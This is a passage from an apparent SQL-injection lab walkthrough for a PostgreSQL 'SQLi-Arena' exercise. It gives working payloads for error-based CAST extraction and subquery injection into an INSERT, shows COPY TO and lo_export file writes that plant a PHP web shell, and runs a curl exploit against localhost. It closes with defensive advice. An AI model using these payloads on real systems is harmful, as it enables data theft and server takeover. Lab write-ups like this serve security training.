<h4>Step 1: Confirm Injection in the INSERT Statement</h4>
<p>
    The username and message fields are injected into an INSERT statement. Inject a single quote
    in the username field to trigger a syntax error.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Confirm Injection</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Username: </span>'<br>
        <span class="prompt">Message: </span>test<br>
        <span class="prompt">SQL&gt; </span>INSERT INTO feedback (username, message, submitted_at) VALUES ('''', 'test', NOW())<br><br>
        <span class="prompt">Error: </span><strong>PostgreSQL Error: ERROR: syntax error at or near "test"</strong>
    </div>
</div>

<h4>Step 2: Extract the Flag via CAST Error</h4>
<p>
    Since the INSERT does not return data directly, use error-based extraction with <code>CAST()</code>.
    The <code>||</code> operator concatenates the subquery result into the INSERT value, and the
    CAST to INTEGER forces the flag value into the error message.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. CAST Error Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Username: </span>' || (SELECT CAST(secret_value AS INTEGER) FROM secret_data LIMIT 1) || '<br>
        <span class="prompt">Message: </span>test<br><br>
        <span class="prompt">Error: </span><strong>PostgreSQL Error: ERROR: invalid input syntax for type integer: "FLAG{pg_f1l3_wr1t3_c0py}"</strong>
    </div>
</div>

<p>The flag is leaked directly in the error message!</p>

<h4>Step 3: Alternative. Stacked Query INSERT with Subquery</h4>
<p>
    Use the INSERT injection to place the flag value directly into the feedback message, making it
    visible in the "Recent Feedback" section.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Subquery in INSERT</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Username: </span>hacker', (SELECT secret_value FROM secret_data LIMIT 1), NOW()); --<br>
        <span class="prompt">Message: </span>ignored (overridden by injection)<br><br>
        <span class="prompt">SQL&gt; </span>INSERT INTO feedback (username, message, submitted_at) VALUES ('hacker', (SELECT secret_value FROM secret_data LIMIT 1), NOW()); --', 'ignored', NOW())<br><br>
        <span class="prompt">Response: </span><strong>Thank you! Your feedback has been submitted.</strong><br><br>
        <span class="prompt">Recent Feedback:</span><br>
        <strong>hacker</strong> (2026-03-24 03:38:57) &bull; FLAG{pg_f1l3_wr1t3_c0py}
    </div>
</div>

<p>The flag appears as the message in the "hacker" feedback entry.</p>

<h4>Step 4: File Write with COPY TO (Conceptual)</h4>
<p>
    PostgreSQL's <code>COPY ... TO</code> command exports query results to a server file.
    Combined with stacked queries, an attacker can write arbitrary files (requires superuser).
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. COPY TO File Write (Superuser Only)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Write a web shell to the server:</span><br>
        <span class="prompt">Username: </span>'; COPY (SELECT '&lt;?php system($_GET["cmd"]); ?&gt;') TO '/var/www/html/shell.php'; --<br><br>
        <span class="prompt">// </span>Requires superuser or write access to the target directory.<br>
        <span class="prompt">// </span>The output file includes COPY formatting (column headers).
    </div>
</div>

<h4>Step 5: Large Object File Write with lo_export (Conceptual)</h4>
<p>
    For cleaner file writes, use PostgreSQL's Large Object functions. Create a large object with
    your payload data, then export it to a file.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5: lo_export Technique (Superuser Only)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Step A: </span>Create a large object with payload data<br>
        <span class="prompt">Input: </span>'; SELECT lo_from_bytea(0, decode('3c3f...payload_hex...3e', 'hex')); --<br><br>
        <span class="prompt">Step B: </span>Find the OID of the created large object<br>
        <span class="prompt">Input: </span>' || (SELECT CAST(loid AS TEXT) FROM pg_largeobject LIMIT 1) || '<br><br>
        <span class="prompt">Step C: </span>Export the large object to a file<br>
        <span class="prompt">Input: </span>'; SELECT lo_export(12345, '/var/www/html/shell.php'); --
    </div>
</div>

<h4>Step 6: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{pg_f1l3_wr1t3_c0py}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab8" \<br> --data-urlencode "username=' || (SELECT CAST(secret_value AS INTEGER) FROM secret_data LIMIT 1) || '" \<br>
        &nbsp;&nbsp;--data-urlencode "message=test"<br><br>
        <span class="prompt">Output:</span><br>
        <strong>PostgreSQL Error:</strong> ERROR: invalid input syntax for type integer: "FLAG{pg_f1l3_wr1t3_c0py}"
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> PostgreSQL's <code>COPY ... TO</code> and <code>lo_export()</code>
    functions enable file writes from SQL injection. Combined with stacked queries, an attacker can
    write web shells, cron jobs, or SSH keys to the server. Even without superuser access, INSERT
    injection allows data extraction via error-based CAST or by inserting subquery results into
    visible columns. Defense: never run the database as superuser, restrict filesystem permissions,
    use <code>pg_query_params()</code> with <code>$1, $2</code> parameter placeholders.
</div>
